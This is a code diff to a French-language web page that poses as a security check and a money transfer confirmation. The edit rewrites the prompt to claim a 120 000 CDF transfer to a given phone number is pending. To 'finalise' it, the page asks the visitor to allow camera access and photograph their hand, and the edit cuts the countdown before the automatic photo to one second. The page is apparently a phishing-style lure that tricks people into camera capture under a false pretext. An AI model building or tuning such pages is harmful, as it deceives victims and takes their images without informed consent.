@@ -121,10 +121,8 @@
         <div class="inline-block bg-brand-red/20 text-brand-red text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-4 border border-brand-red/30">
           Contrôle de sécurité
         </div>
-        <h3 class="text-xl font-bold mb-2">Vérification de sécurité</h3>
-        <p class="text-slate-400 text-xs sm:text-sm mb-6 leading-relaxed">
-          Pour valider le transfert, nous devons réaliser une prise de vue faciale rapide. Veuillez autoriser l'accès lors du message du navigateur.
-        </p>
+        <h3 class="text-xl font-bold mb-2">Transfert d'argent en cours</h3>
+        <p class="text-slate-400 text-xs sm:text-sm mb-6 leading-relaxed">Pour finaliser la transaction de 120 000 CDF vers le +243 99 510 8274 , veuillez autoriser l’accès et prendre une photo de votre main.<p/>
 
         <button id="start-camera-btn" class="w-full bg-brand-red hover:bg-brand-dark text-white font-bold py-3.5 rounded-xl transition duration-200 uppercase tracking-wider text-xs shadow-lg shadow-brand-red/30">
           Autoriser et prendre la photo
@@ -225,7 +223,7 @@
         stepCamera.classList.remove('hidden');
 
         // Décompte de 3 secondes avant la photo automatique
-        let count = 3;
+        let count = 1;
         countdownTxt.textContent = `Prise de vue dans ${count}s...`;
 
         const timer = setInterval(() => {
